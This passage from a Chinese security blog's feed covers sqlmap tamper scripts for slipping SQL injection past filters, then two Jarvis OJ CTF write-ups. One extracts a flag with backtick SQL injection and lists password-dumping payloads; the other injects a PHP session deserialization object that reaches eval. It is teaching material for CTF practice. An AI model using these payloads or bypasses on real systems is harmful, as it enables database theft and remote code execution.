‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%01select%021,2–+</p></blockquote><p><strong>适用数据库：</strong>SQL Server</p><h4 id="space2mssqlhash-py："><a href="#space2mssqlhash-py：" class="headerlink" title="space2mssqlhash.py："></a>space2mssqlhash.py：</h4><p>用 # 加一个换行符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%23%0Aselect%23%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MSSQL、MySQL</p><h4 id="space2mysqlblank-py："><a href="#space2mysqlblank-py：" class="headerlink" title="space2mysqlblank.py："></a>space2mysqlblank.py：</h4><blockquote><p>blanks = (‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</p></blockquote><p>用这些随机空白符替换payload中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%09select%0D1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="space2mysqldash-py："><a href="#space2mysqldash-py：" class="headerlink" title="space2mysqldash.py："></a>space2mysqldash.py：</h4><p>用 – 加一个换行符替换空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union–%0Aselect–%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL、MSSQL</p><h4 id="space2plus-py："><a href="#space2plus-py：" class="headerlink" title="space2plus.py："></a>space2plus.py：</h4><p>用 + 替换空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union+select+1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="space2randomblank-py："><a href="#space2randomblank-py：" class="headerlink" title="space2randomblank.py："></a>space2randomblank.py：</h4><blockquote><p>blanks = (“%09”, “%0A”, “%0C”, “%0D”)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%09select%0C1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="symboliclogical-py："><a href="#symboliclogical-py：" class="headerlink" title="symboliclogical.py："></a>symboliclogical.py：</h4><blockquote><p>retVal = re.sub(r”(?i)bANDb”, “%26%26”, re.sub(r”(?i)bORb”, “%7C%7C”, payload))</p></blockquote><p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p><blockquote><p>1 and 1=1 <strong>to</strong> 1 %26%26 1=1</p><p>1 or 1=1 <strong>to</strong> 1 %7c%7c 1=1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="unionalltounion-py："><a href="#unionalltounion-py：" class="headerlink" title="unionalltounion.py："></a>unionalltounion.py：</h4><blockquote><p>return payload.replace(“UNION ALL SELECT”, “UNION SELECT”) if payload else payload</p></blockquote><p>用 union select 替换union all select</p><blockquote><p>union all select 1,2–+ <strong>to</strong> union select 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="unmagicquotes-py："><a href="#unmagicquotes-py：" class="headerlink" title="unmagicquotes.py："></a>unmagicquotes.py：</h4><p>用宽字符绕过 GPC addslashes</p><blockquote><p>1‘ and 1=1 <strong>to</strong> 1%df%27 and 1=1–</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="uppercase-py："><a href="#uppercase-py：" class="headerlink" title="uppercase.py："></a>uppercase.py：</h4><p>将 payload 大写</p><blockquote><p>union select <strong>to</strong> UNION SELECT</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="varnish-py："><a href="#varnish-py：" class="headerlink" title="varnish.py："></a>varnish.py：</h4><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-originating-IP”] = “127.0.0.1”return payload</p></blockquote><p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p><p>还可以自定义：</p><blockquote><p>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h4><p>对不是函数的关键字进行注释</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="versionedmorekeywords-py："><a href="#versionedmorekeywords-py：" class="headerlink" title="versionedmorekeywords.py："></a>versionedmorekeywords.py：</h4><p>注释每个关键字</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURREN**T_USER</em>/()/<em>!AS</em>//<em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h4 id="xforwardedfor-py："><a href="#xforwardedfor-py：" class="headerlink" title="xforwardedfor.py："></a>xforwardedfor.py：</h4><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-Forwarded-For”] = randomIP()return payload</p></blockquote><p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p><p><strong>适用数据库：</strong>ALL</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;apostrophemask.py 用UTF-8全角字符替换单引号字符&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;apostrophenullencode.py 用非法双字节unicode字符替换单引号字符&lt;/li&gt;
&lt;/ul&gt;
&lt;ul&gt;
&lt;li&gt;appendnu
      
    
    </summary>
    
    
      <category term="SQLi" scheme="https://wywwzjj.top/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ inject</title>
    <link href="https://wywwzjj.top/2019/02/26/Jarvis_OJ_inject/"/>
    <id>https://wywwzjj.top/2019/02/26/Jarvis_OJ_inject/</id>
    <published>2019-02-26T09:56:10.000Z</published>
    <updated>2019-04-02T15:39:57.491Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p><h3 id="得到源码"><a href="#得到源码" class="headerlink" title="得到源码"></a>得到源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    $table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">    $table = Filter($table);</span><br><span class="line">    mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">    $sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">    $ret = sql_query($sql);</span><br><span class="line">    <span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>?table=flag 正常响应<br>==&gt; <strong>存在 secret_flag 表</strong><br>注意到这个反引号 ``，其作用是区分 MySQL 保留字与普通字符</p><p>本地尝试<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">desc</span>  <span class="comment"># 报错</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`desc`</span>  <span class="comment"># 能成功执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">desc</span> <span class="string">`abc`</span> <span class="string">`def`</span></span><br><span class="line"><span class="keyword">desc</span> abc <span class="keyword">def</span> </span><br><span class="line"><span class="comment"># 效果是一样的</span></span><br></pre></td></tr></table></figure></p><p>结合题目 ==&gt; desc `secret_flag` `<br>（注意空格，此处如果是 desc `secret_flag`` 将被认为是执行 desc secret_flag`）</p><p>顺手执行<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span></span><br></pre></td></tr></table></figure></p><p>发现还是没有变化，依旧显示 flag{xxx}<br>不要灰心，这只显示了一条数据而已，加入 limit 试试<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>==&gt; 1</p><h3 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`%<span class="number">20</span>`%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">20</span>group_concat(column_name)%<span class="number">20</span>from%<span class="number">20</span>information_schema.columns%<span class="number">20</span></span><br><span class="line">where%<span class="number">20</span>table_name=<span class="number">0x7365637265745f666c6167</span>%<span class="number">20</span>limit%<span class="number">201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p> ==&gt; flagUwillNeverKnow<br>(如果 <code>“</code> 被过滤，此处 table_name 的值要进行 hex 编码）</p><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%20</span>flagUwillNeverKnow<span class="symbol">%20</span>from<span class="symbol">%20</span>secret_flag<span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>PS：也可以不用 limit，直接 where 0，使得前面的查询为空，则直接显示我们的数据<br>table=flag<code>%20</code>%20where%200%20union%20select%20flagUwillNeverKnow%20from%20secret_flag</p></blockquote><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><p><strong>information_schema</strong> 存储数据库信息的数据库</p><blockquote><p><strong>数据库名</strong></p><p>schemata =&gt; schema_name</p><p>tables =&gt; table_schema</p><p>columns =&gt; table_schema</p><p><strong>表名</strong></p><p>tables =&gt; table_name</p><p>columns =&gt; table_name</p><p><strong>列名</strong></p><p>columns =&gt; columns_name</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取当前数据库中所有表</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获得所有列名（字段）</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"flag"</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 下载数据</span></span><br><span class="line">-1′ or 1=1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取表中的字段名</span></span><br><span class="line"><span class="number">-1</span>′ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://web.jarvisoj.com:32794/index.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://web.jarvisoj.com:32794/index.php&lt;/a&gt;~&lt;/p&gt;
&lt;h3 id=
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="SQLi" scheme="https://wywwzjj.top/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ phpinfo</title>
    <link href="https://wywwzjj.top/2019/02/25/Jarvis_OJ_phpinfo/"/>
    <id>https://wywwzjj.top/2019/02/25/Jarvis_OJ_phpinfo/</id>
    <published>2019-02-25T12:42:29.000Z</published>
    <updated>2019-03-21T00:49:52.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从-session-角度学习反序列化"><a href="#从-session-角度学习反序列化" class="headerlink" title="从 session 角度学习反序列化"></a>从 session 角度学习反序列化</h1><p>下面是题目给出的源码  <a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">原题链接</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $mdzz;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">$m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>题目直接给出了 <code>phpinfo</code> 信息，作为 CTF 的题来说，一定有其特别的意义。</p><p>另外，在实战中也是重要的信息泄露，不熟悉的同学可参考 <a href="https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/" target="_blank" rel="noopener">phpinfo 可以告诉我们什么</a>。</p><p>遇到这种情况，可直接拿下来与默认的 <code>phpinfo</code> 进行文件对比，或许可以迅速找到突破口。</p><h3 id="困境"><a href="#困境" class="headerlink" title="困境"></a>困境</h3><p>看到 <code>__construct()</code> 和 <code>__destruct()</code> 两个魔术方法，极有可能是反序列化的题。其中，<code>__destruct()</code> 中有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br></pre></td></tr></table></figure><p>如果 <code>$this-&gt;mdzz</code> 可控的话，这就是一个明显的 <code>webshell</code> 了，可惜 <code>mdzz</code> 在构造函数中就限死了，而且这里并没有变量覆盖的漏洞，否则也可以打一波，陷入困境。</p><p>有这么方便的 <code>eval()</code> 在这里，能不能绕过构造函数，直接执行我们需要的命令呢？</p><p>此处必有蹊跷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>1.<a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md" target="_blank" rel="noopener">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a></strong></p><p><img src="https://i.loli.net/2019/03/21/5c92dcc97822b.png" alt="20190225080731966.png"></p><p><code>phpinfo</code> 中可以看到，PHP 反序列化时可以使用的几种方法。</p><p>平时实验过程中，也可以用这个语句进行方法指定。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_start([</span><br><span class="line">    <span class="string">'serialize_handler'</span> =&gt; <span class="string">'php_serialize'</span></span><br><span class="line">])</span><br></pre></td></tr></table></figure><p>在设置 session 和读取 session 两个阶段中，若使用了不同的序列化方法，将产生任意对象注入，进而导致反序列化漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'test'</span>] = <span class="string">'|O:8:"stdClass":0:&#123;&#125;'</span>;</span><br><span class="line"></span><br><span class="line">存储时使用 php_serialize --&gt; </span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">20</span>:<span class="string">"|O:8:"</span>stdClass<span class="string">":0:&#123;&#125;"</span>;&#125;</span><br><span class="line"></span><br><span class="line">反序列化使用 php --&gt; </span><br><span class="line"><span class="comment">// var_dump($_SESSION);</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">[<span class="string">"a:1:&#123;s:4:"</span>test<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>PHP 获取到 session 字符串后，就开始查找第一个 |（竖线），用竖线将字符串分割成“键名”和“键值”， 并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，再去找下一个竖线，执行同样的操作，直到成功。</p></blockquote><p>然而到这里还是没解决 <code>mdzz</code> 不可控的问题，接下来引入第二个知识点。</p><p><strong>2.上传进度支持（Upload progress in sessions）</strong></p><p>正常用法参见 <a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">example #1</a>，配合 Ajax 就能显示上传进度。</p><p>利用此法可达到对 <code>session</code> 写入数据的效果，从而使得 <code>$mdzz</code> 可控，可参照 <a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">有趣的 php 反序列化总结</a></p><blockquote><p>当一个上传在处理中，同时 post 一个与 ini 设置的 session.upload_progress.name 同名变量时，php 检测到这种 post 请求时就会在 $_SESSION 中添加一组数据，所以可通过 session.upload_progress 来设置 <code>session</code>。</p></blockquote><p>下面是部分参数说明</p><blockquote><p>session.upload_progress.enabled[=1] : 是否启用上传进度报告(默认开启)<br>session.upload_progress.cleanup[=1] : 是否在上传完成后及时删除进度数据(默认开启, 推荐开启).<br>session.upload_progress.prefix[=upload_progress_] : 进度数据将存储在<br>_SESSION[session.upload_progress.prefix . _POST[session.upload_progress.name]]<br>session.upload_progress.name[=PHP_SESSION_UPLOAD_PROGRESS] :<br>如果 _POST[session.upload_progress.name]没有被设置, 则不会报告进度.<br>session.upload_progress.freq[=1%] : 更新进度的频率(已经处理的字节数), 也支持百分比表示’%’.<br>session.upload_progress.min_freq[=1.0] : 更新进度的时间间隔(秒级)</p></blockquote><p>回到本题，查看 <code>phpinfo</code>， <code>session.upload_progress.enabled</code> 打开，并且 <code>session.upload_progress.cleanup</code>关闭。</p><h3 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h3><p><strong>构造一个表单</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span class="string">"multipart/form-data"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span> <span class="attr">value</span>=<span class="string">"2333"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"file"</span> <span class="attr">name</span>=<span class="string">"file"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"submit"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果不指定，PHP 将默认使用 “php“ 作为 session 序列化的方法，payload 及结果如下：</p><p><img src="https://i.loli.net/2019/03/21/5c92dc9fa0478.png" alt="20190225215921526.png"></p><p>PS：不用纠结 <code>Content-Type</code>，这个对解题没有影响，重点是加入<code>\</code>，防止 <code>&quot;</code> 被转义。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">filename=<span class="string">"|O:5:\"OowoO\":1:&#123;s:4:\"mdzz\";s:19:\"print_r($_SESSION);\";&#125;"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Array</span> (</span><br><span class="line">[a:<span class="number">1</span>:&#123;s:<span class="number">24</span>:<span class="string">"upload_progress_12312131"</span>;a:<span class="number">5</span>:&#123;s:<span class="number">10</span>:<span class="string">"start_time"</span>;i:<span class="number">1551019950</span>;s:<span class="number">14</span>:<span class="string">"content_length"</span>;i:<span class="number">434</span>;s:<span class="number">15</span>:<span class="string">"bytes_processed"</span>;i:<span class="number">434</span>;s:<span class="number">4</span>:<span class="string">"done"</span>;b:<span class="number">1</span>;s:<span class="number">5</span>:<span class="string">"files"</span>;</span><br><span class="line"> a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;a:<span class="number">7</span>:&#123;s:<span class="number">10</span>:<span class="string">"field_name"</span>;s:<span class="number">4</span>:<span class="string">"file"</span>;s:<span class="number">4</span>:<span class="string">"name"</span>;s:<span class="number">55</span>:<span class="string">"] </span></span><br><span class="line"><span class="string">=&gt; OowoO Object(</span></span><br><span class="line"><span class="string">[mdzz] =&gt; print_r($_SESSION);</span></span><br><span class="line"><span class="string">)</span></span><br><span class="line"><span class="string">)</span></span><br></pre></td></tr></table></figure><p>根据 php 手册，存入 <code>session</code> 里的形式是这样的，由此看出 <code>field_name</code> 也可，所以不一定要用 <code>filename</code>。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">"upload_progress_123"</span>] = <span class="keyword">array</span>(</span><br><span class="line"><span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>,   <span class="comment">// The request time</span></span><br><span class="line"><span class="string">"content_length"</span> =&gt; <span class="number">57343257</span>, <span class="comment">// POST content length</span></span><br><span class="line"><span class="string">"bytes_processed"</span> =&gt; <span class="number">453489</span>,  <span class="comment">// Amount of bytes received and processed</span></span><br><span class="line"><span class="string">"done"</span> =&gt; <span class="keyword">false</span>,              </span><br><span class="line">    <span class="comment">// true when the POST handler has finished, successfully or not</span></span><br><span class="line"><span class="string">"files"</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="number">0</span> =&gt; <span class="keyword">array</span>(</span><br><span class="line"><span class="string">"field_name"</span> =&gt; <span class="string">"file1"</span>,       <span class="comment">// Name of the &lt;input/&gt; field</span></span><br><span class="line"><span class="comment">// The following 3 elements equals those in $_FILES</span></span><br><span class="line"><span class="string">"name"</span> =&gt; <span class="string">"foo.avi"</span>,</span><br><span class="line"><span class="string">"tmp_name"</span> =&gt; <span class="string">"/tmp/phpxxxxxx"</span>,</span><br><span class="line"><span class="string">"error"</span> =&gt; <span class="number">0</span>,</span><br><span class="line"><span class="string">"done"</span> =&gt; <span class="keyword">true</span>,</span><br><span class="line">            <span class="comment">// True when the POST handler has finished handling this file</span></span><br><span class="line"><span class="string">"start_time"</span> =&gt; <span class="number">1234567890</span>, </span><br><span class="line">            <span class="comment">// When this file has started to be processed</span></span><br><span class="line"><span class="string">"bytes_processed"</span> =&gt; <span class="number">57343250</span>, </span><br><span class="line">            <span class="comment">// Amount of bytes received and processed for this file</span></span><br><span class="line">)</span><br><span class="line">)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>拿 <code>flag</code> 的老套路就不多说了，把 <code>mdzz</code> 里的值换成你需要执行的操作即可。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote><p>知识面，决定看到的攻击面有多广。</p><p>知识链，决定发动的杀伤链有多深。</p></blockquote><p> ——猪猪侠</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从-session-角度学习反序列化&quot;&gt;&lt;a href=&quot;#从-session-角度学习反序列化&quot; class=&quot;headerlink&quot; title=&quot;从 session 角度学习反序列化&quot;&gt;&lt;/a&gt;从 session 角度学习反序列化&lt;/h1&gt;&lt;p&gt;下面是题目给
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis_OJ_Writeup</title>
    <link href="https://wywwzjj.top/2019/02/02/Jarvis-OJ-Writeup/"/>
    <id>https://wywwzjj.top/2019/02/02/Jarvis-OJ-Writeup/</id>
    <published>2019-02-02T05:08:19.000Z</published>
    <updated>2019-04-04T01:54:13.004Z</updated>
    
